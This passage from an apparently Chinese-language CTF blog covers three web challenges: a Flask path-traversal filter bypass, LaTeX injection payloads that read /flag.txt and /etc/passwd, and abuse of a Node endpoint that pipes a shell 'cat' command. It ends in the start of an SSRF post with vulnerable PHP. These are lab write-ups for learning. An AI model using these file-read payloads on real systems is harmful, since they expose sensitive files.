    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">calculate_factorial</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    safe_theme <span class="token operator">=</span> filter_path<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"theme"</span><span class="token punctuation">,</span> <span class="token string">"themes/theme1.css"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>safe_theme<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    theme <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span>
            error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>
            <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>
        result <span class="token operator">=</span> factorial<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> result<span class="token operator">=</span>result<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        error <span class="token operator">=</span> <span class="token string">"Invalid input: Please enter a non-negative integer."</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> error<span class="token operator">=</span>error<span class="token punctuation">,</span> css<span class="token operator">=</span>theme<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    sys<span class="token punctuation">.</span>setrecursionlimit<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dockerfileæ–‡ä»¶</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM python:3.10-slim-buster

RUN pip3 <span class="token function">install</span> flask
COPY flag.txt /

WORKDIR /app
COPY app/* /app/
copy app/templates/* /app/templates/
copy app/themes/* /app/themes/

EXPOSE <span class="token number">5000</span>

ENTRYPOINT <span class="token punctuation">[</span><span class="token string">"python3"</span>, <span class="token string">"app.py"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¯ä»¥å¾—çŸ¥flagæ–‡ä»¶åä¸ºflag.txtï¼Œ<code>path = path.replace(&quot;../&quot;, &quot;&quot;)</code>è¿™é‡ŒæŠŠ<code>../</code>ä¹Ÿç»™è¿‡æ»¤äº†<br>ç»•è¿‡çš„è¯æˆ‘è¯•äº†è¯•å‘ç°<code>//flag.txtå’Œ..///flag.txt</code>éƒ½å¯ä»¥ç»•è¿‡<br><img src="https://img-blog.csdnimg.cn/0f66898d59574faf8b13befd85b71cee.png" alt="1"></p>
<h3 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h3><blockquote>
<p>bryanguoï¼ˆä¸ctfæ— å…³ï¼‰ä¸€ç›´è¯´å®ƒçš„å‘éŸ³æ˜¯latekï¼Œè€Œä¸æ˜¯åƒæ‰‹å¥—ææ–™é‚£æ ·çš„ä¹³èƒ¶ã€‚ä¸ç®¡æ€æ ·ï¼Œæˆ‘åˆ¶ä½œäº†è¿™ä¸ªç®€å•çš„åº”ç”¨ç¨‹åºï¼Œè¿™æ ·ä»–å°±ä¸å†æ”¯ä»˜èƒŒé¡µçš„è´¹ç”¨äº†ã€‚<br>æ³¨æ„ï¼šæ ‡å¿—ä»…åœ¨&#x2F;flag.txt</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3730939722a3412fb00a4fd24179ee9c.png" alt="1"><br>è¿™ä¸ªå°±æ˜¯ä¸€ä¸ªåœ¨çº¿çš„LaTexç¼–è¾‘å™¨ï¼Œå°†ç¼–è¾‘çš„å†…å®¹ä»¥pdfçš„æ–‡ä»¶å½¢å¼å±•ç°å‡ºæ¥ï¼ŒæŸ¥çœ‹äº†ä¸€ç¯‡<a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">å›½å¤–å¤§ä½¬çš„åšå®¢</a>ï¼Œä»‹ç»äº†LaTexæ³¨å…¥çš„ä¸€äº›è¯­æ³•ã€‚</p>
<p>è¾“å…¥</p>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\input{&#x2F;flag.txt}<br>\end{document} </p>
</blockquote>
<p>ä¼šå‘ç°ç»™å‡ºäº†ä¸€éƒ¨åˆ†flag<br><img src="https://img-blog.csdnimg.cn/fbb8040055734064a248c8036fd23c2c.png" alt="1"><br>é‚£ä¹ˆå¦ä¸€éƒ¨åˆ†æ€ä¹ˆå¾—åˆ°å‘¢ï¼Ÿå€Ÿé‰´äº†wpçœ‹åˆ°ä»–ä½¿ç”¨äº†æ‰¹å¤„ç†æ¨¡å¼</p>
<blockquote>
<p>\batchmodeï¼šåœ¨ LaTeX ä¸­ï¼Œè¯¥å‘½ä»¤ä¼šæŠ‘åˆ¶æ‰€æœ‰ç»ˆç«¯å’Œæ—¥å¿—æ–‡ä»¶è¾“å‡ºï¼Œè¿™æ„å‘³ç€ç¼–è¯‘è¿‡ç¨‹ä¸ä¼šåœ¨ç»ˆç«¯ä¸Šäº§ç”Ÿä»»ä½•æ¶ˆæ¯æˆ–æç¤ºã€‚å®ƒé€šå¸¸ç”¨äºä»¥æ‰¹å¤„ç†æ¨¡å¼è¿è¡Œ LaTeXï¼Œåœ¨å¤„ç†æ–‡æ¡£æ—¶ä¸ä¼šä¸­æ–­ç”¨æˆ·è¾“å…¥æˆ–åé¦ˆã€‚å½“æ‚¨æƒ³è¦è‡ªåŠ¨åŒ–æ–‡æ¡£ç”Ÿæˆè¿‡ç¨‹æ—¶ï¼Œè¿™ä¼šå¾ˆæœ‰å¸®åŠ©</p>
</blockquote>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\batchmode<br>\input{&#x2F;flag.txt}<br>\end{document} </p>
</blockquote>
<blockquote>
<p>\documentclass{article}<br>\begin{document}<br>Hello, world!<br>\usepackage{verbatim}<br>\verbatiminput{&#x2F;etc&#x2F;passwd}<br>\end{document} </p>
</blockquote>
<blockquote>
<p>åœ¨LaTeXæ–‡æ¡£ä¸­ï¼Œ\usepackage{verbatim}ç”¨äºå¯¼å…¥åä¸ºâ€verbatimâ€çš„å®åŒ…ï¼Œå®ƒæä¾›äº†åœ¨æ–‡æ¡£ä¸­æ’å…¥åŸå§‹æ–‡æœ¬ï¼ˆverbatimæ–‡æœ¬ï¼‰çš„åŠŸèƒ½ã€‚å½“ä½ å¸Œæœ›åœ¨æ–‡æ¡£ä¸­åŸæ ·æ˜¾ç¤ºä¸€æ®µä»£ç ã€é…ç½®æ–‡ä»¶æˆ–å…¶ä»–ä»»ä½•æ–‡æœ¬æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨è¯¥å®åŒ…ã€‚</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/af8f210f009944a088f99b6809eb579f.png" alt="1"><br>å‚è€ƒé“¾æ¥<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection">é“¾æ¥</a><br><a href="https://salmonsec.com/cheatsheets/exploitation/latex_injection">é“¾æ¥</a></p>
<h3 id="uwuctf"><a href="#uwuctf" class="headerlink" title="uwuctf"></a>uwuctf</h3><blockquote>
<p>è¿™ä¸ª rust uwuifier é€Ÿåº¦å¤ªå¿«äº†ï¼Œæˆ‘ç¡®ä¿¡åªè¦æˆ‘èƒ½æ¬ºéª—æˆ‘çš„èŠ‚ç‚¹ï¼Œå®ƒå°±ä¼šæ‰©å±•åˆ°æœˆçƒã€‚uwuifier å³æœåŠ¡ä¸“ä¸šç‰ˆä½•æ—¶è®¢é˜…ï¼Ÿ<br>æ›´æ–°ï¼šzip å‡ ä¹ä¸æœåŠ¡å™¨ç›¸åŒï¼Œé™¤äº†æˆ‘ä»¬åˆ é™¤äº†challenge.yml å’Œflag.txt</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/ef485e2862cb42e8883d69eae95ea0a5.png" alt="1"><br>è¿™é‡Œå°±æ˜¯è®¿é—®ä¸Šé¢çš„æ–‡ä»¶å½“æˆ‘åˆ©ç”¨LFIæ¼æ´æ—¶å‘ç°<code>../</code>è¢«è¿‡æ»¤äº†ã€‚åç»­æµ‹è¯•äº†å¾ˆå¤šéä¹Ÿæ²¡æœ‰æ€è·¯ã€‚æœ€åçœ‹è§åˆ«äººçš„wpç»“åˆæºç <br>è¿™æ˜¯index.jsæ–‡ä»¶</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"dotenv"</span><span class="token punctuation">;</span>
<span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> fs <span class="token keyword">from</span> <span class="token string">"fs"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> path <span class="token keyword">from</span> <span class="token string">"path"</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>quote<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"shell-quote"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span>exec<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"child_process"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> textsDir <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"public"</span><span class="token punctuation">,</span> <span class="token string">"texts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> uwuifierPath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"uwuify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">"express"</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> morgan <span class="token keyword">from</span> <span class="token string">"morgan"</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'trust proxy'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'loopback'</span><span class="token punctuation">,</span> <span class="token string">'linklocal'</span><span class="token punctuation">,</span> <span class="token string">'uniquelocal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">morgan</span><span class="token punctuation">(</span><span class="token string">"combined"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span><span class="token string">"public/index.html"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">root</span><span class="token operator">:</span> process<span class="token punctuation">.</span><span class="token function">cwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// bug fix</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/uwuify"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no hacking >:("</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">let</span> cmd <span class="token operator">=</span> <span class="token string">"cat "</span> <span class="token operator">+</span> <span class="token function">quote</span><span class="token punctuation">(</span><span class="token punctuation">[</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>src<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" | "</span> <span class="token operator">+</span> uwuifierPath<span class="token punctuation">;</span>
    <span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
      <span class="token literal-property property">cwd</span><span class="token operator">:</span> textsDir
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>stdout <span class="token operator">+</span> stderr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"no src provided"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/dir"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">"txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> output <span class="token operator">=</span> <span class="token string">"texts avali to uwuify: "</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> files <span class="token operator">=</span> <span class="token keyword">await</span> fs<span class="token punctuation">.</span>promises<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>textsDir<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> file <span class="token keyword">of</span> files<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        output <span class="token operator">+=</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> file<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    output <span class="token operator">+=</span> <span class="token string">"\r\n\r\nUse /uwuify?src=&lt;text file name> to uwuify a text file!"</span><span class="token punctuation">;</span>
    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Server Up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™æ˜¯dockerfileæ–‡ä»¶</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM node:16
COPY ./* /home/node/app/
COPY ./public/* /home/node/app/public/
COPY ./public/texts/* /home/node/app/public/texts/
WORKDIR /home/node/app
RUN <span class="token function">npm</span> <span class="token function">install</span>
ENV <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">8082</span>
RUN <span class="token function">chown</span> <span class="token parameter variable">-R</span> node:node /home/node/app
<span class="token environment constant">USER</span> <span class="token function">node</span>
CMD <span class="token punctuation">[</span><span class="token string">"bash"</span>, <span class="token string">"launch.sh"</span><span class="token punctuation">]</span>
EXPOSE <span class="token number">8082</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯ä»¥çœ‹åˆ°å®é™…ä¸Šflag.txtå°±åœ¨&#x2F;home&#x2F;node&#x2F;app&#x2F;flag.txt<br>è¯»å–å½“å‰ç›®å½•ä½¿ç”¨<code>~</code>ï¼Œå…¶å®<code>https://uwuasaservice.amt.rs/uwuify?src=~</code>ä¹Ÿå°±æ˜¯<code>cat ~</code>ï¼Œè¿™ä¸ªæ—¶å€™çˆ†å‡ºè·¯å¾„</p>
<blockquote>
<p>cat: &#x2F;home&#x2F;node: Is a directory</p>
</blockquote>
<p>é‚£ä¹ˆä¸‹é¢å°±ç›´æ¥è¯»å–flagæ–‡ä»¶<br><a href="https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt">https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt</a></p>
<blockquote>
<p>amateuwsctf{so_wmao_this_fwag_is_gonna_be_a_wot_wongew_than_most_fwag_othew_fwags_good_wuck_have_fun_decoding_it_end_of_fwag}</p>
</blockquote>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¶‰åŠSSRFçš„ä¸€äº›tricks</title>
    <url>/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><blockquote>
<p>phpé‡åˆ°ä¸è®¤è¯†çš„åè®®å°±ä¼šå½“ç›®å½•å¤„ç†</p>
</blockquote>
<p>å‚è€ƒé¢˜ç›®<a href="https://ctf.show/challenges#web2_%E6%95%85%E4%BA%BA%E5%BF%83-482">ctfshowæœˆé¥¼æ¯æ•…äººå¿ƒ</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">7</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">**</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>     
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><code>if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</code><br>aæ˜¯æ•°å­—ï¼Œaçš„é•¿åº¦å°äº7ï¼Œaä¸ç­‰äº0ï¼Œaçš„å¹³æ–¹æ˜¯0</p>
</blockquote>
<p>ç”±äºé•¿åº¦é™åˆ¶ï¼Œè¿™ä¸ªæ—¶å€™åˆ©ç”¨åˆ°ç§‘å­¦è®¡æ•°æ³•æ‰¾ä¸€ä¸ªæ¯”è¾ƒå°çš„æ•°ä¾‹å¦‚<strong>1e-234</strong></p>
<blockquote>
